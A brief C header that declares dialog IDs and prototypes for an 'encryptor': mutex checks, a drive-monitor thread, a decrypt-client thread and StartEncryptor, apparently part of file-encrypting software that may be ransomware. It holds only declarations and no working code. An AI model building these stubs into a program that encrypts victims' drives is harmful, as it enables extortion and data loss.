#pragma once

#define IDC_SCAN_SERVER 2101
#define IDC_SCAN_FOUND 2102
#define IDC_SCAN_DONE 2103

// mutex
BOOL CheckEncryptorMutex(LPCTSTR);
INT CreateEncryptorMutex(INT);
// threads
DWORD WINAPI CheckDKYThread(void);
DWORD WINAPI DriveMonitorThread(void);
DWORD WINAPI UpdateResFileThread(void);
DWORD WINAPI DecryptClientThread(LPVOID);
// encryptor
BOOL StartEncryptor(void);